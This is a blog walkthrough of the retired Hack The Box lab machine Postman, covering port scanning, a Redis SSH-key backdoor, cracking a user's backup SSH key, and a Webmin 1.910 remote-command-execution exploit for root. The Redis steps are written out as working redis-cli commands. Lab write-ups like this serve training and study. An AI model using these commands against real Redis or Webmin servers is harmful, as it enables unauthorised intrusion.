---
layout: post
title: "Postman: Hack The Box Walkthrough"
date: 2020-03-14 16:50:38 +0000
last_modified_at: 2020-03-14 16:50:38 +0000
category: Walkthrough
tags: ["Hack The Box", Postman, retired, Linux, Easy]
comments: true
image:
  feature: postman-htb-walkthrough.jpg
  credit: ninita_7 / Pixabay
  creditlink: https://pixabay.com/photos/post-letter-mail-box-letter-boxes-2828146/
---

This post documents the complete walkthrough of Postman, a retired vulnerable [VM][1] created by [TheCyberGeek][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Postman is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let\'s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.160 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-11-03 13:51:36 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 10000/tcp on 10.10.10.160                                 
Discovered open port 6379/tcp on 10.10.10.160                                  
Discovered open port 80/tcp on 10.10.10.160                                    
Discovered open port 22/tcp on 10.10.10.160
```

Interesting list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,6379,10000 -A --reason -oN nmap.txt 10.10.10.160
...
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   syn-ack ttl 63 Redis key-value store 4.0.9
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.910 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

Hmm. Other than the usual `ssh` and `http` services, we also have Redis and MiniServ running. Anyhow, this is what the `http` site looks like.

<a class="image-popup">
![1816123a.png](/assets/images/posts/postman-htb-walkthrough/1816123a.png)
</a>

### Redis SSH Backdoor

Anyway since the Redis service is available, let's check and see what we can glean from there.

<a class="image-popup">
![28521bc8.png](/assets/images/posts/postman-htb-walkthrough/28521bc8.png)
</a>

Interesting. The creator seems to be suggesting that there\'s a `redis` SSH account and the way to get a foothold is to dump a SSH public key we control to `authorized_keys`.

That should be easy.

1. `ssh-keygen -f redis`
2. `echo -ne "\n\n" > public; cat redis.pub >> public`
3. `redis-cli -h 10.10.10.160 SLAVEOF NO ONE`
3. `cat public | redis-cli -h 10.10.10.160 -x set pub`
4. `redis-cli -h 10.10.10.160 CONFIG SET dbfilename authorized_keys`
5. `redis-cli -h 10.10.10.160 SAVE`

I've incorporated the above steps into a script to save a bit of time because many HTB players are chasing after a Metasploit exploit that somehow didn't work as expected.

<a class="image-popup">
![b84c9e83.png](/assets/images/posts/postman-htb-walkthrough/b84c9e83.png)
</a>

### Matt's Backup SSH Key

During enumeration of `redis`'s account, I noticed that there is another account with UID 1000 (Matt). That would mean that the file `user.txt` is in Matt's home directory.

<a class="image-popup">
![6c8021b8.png](/assets/images/posts/postman-htb-walkthrough/6c8021b8.png)
</a>

Look what we found!

<a class="image-popup">
![397bd523.png](/assets/images/posts/postman-htb-walkthrough/397bd523.png)
</a>

Matt is careless to leave a backup of his password-protected SSH private key around.

<a class="image-popup">
![52c92cfb.png](/assets/images/posts/postman-htb-walkthrough/52c92cfb.png)
</a>

Something else is up. Notice that Matt cannot login via SSH.

<a class="image-popup">
![cb6018ab.png](/assets/images/posts/postman-htb-walkthrough/cb6018ab.png)
</a>

What good is a password-protected private key if we can't login via SSH? Well, we can crack the key's password and see what it brings us.

<a class="image-popup">
![657cca71.png](/assets/images/posts/postman-htb-walkthrough/657cca71.png)
</a>

And guess what. We can `su` as Matt with that password.

<a class="image-popup">
![b73a8c9e.png](/assets/images/posts/postman-htb-walkthrough/b73a8c9e.png)
</a>

There you have it. The file `user.txt` is indeed in Matt's home directory.

<a class="image-popup">
![5d53b140.png](/assets/images/posts/postman-htb-walkthrough/5d53b140.png)
</a>

## Privilege Escalation

During enumeration of Matt's account, I noticed the presence of a file in `/etc/webmin/Matt.acl`, which sort of gave me an idea—maybe Matt is able to log in to the Webmin using the same credential (`Matt:computer2008`)?

<a class="image-popup">
![5eea3d2f.png](/assets/images/posts/postman-htb-walkthrough/5eea3d2f.png)
</a>

No shit.

### Webmin 1.910 - 'Package Updates' Remote Command Execution

Long story short. As much as I wanted to avoid Metasploit, this is one exploit that executes better with it.

<a class="image-popup">
![a5c6060b.png](/assets/images/posts/postman-htb-walkthrough/a5c6060b.png)
</a>

This is way too easy.

<a class="image-popup">
![9dfc4cec.png](/assets/images/posts/postman-htb-walkthrough/9dfc4cec.png)
</a>

### Getting `root.txt`

<a class="image-popup">
![f1552c46.png](/assets/images/posts/postman-htb-walkthrough/f1552c46.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/215
[2]: https://www.hackthebox.eu/home/users/profile/114053
[3]: https://www.hackthebox.eu/
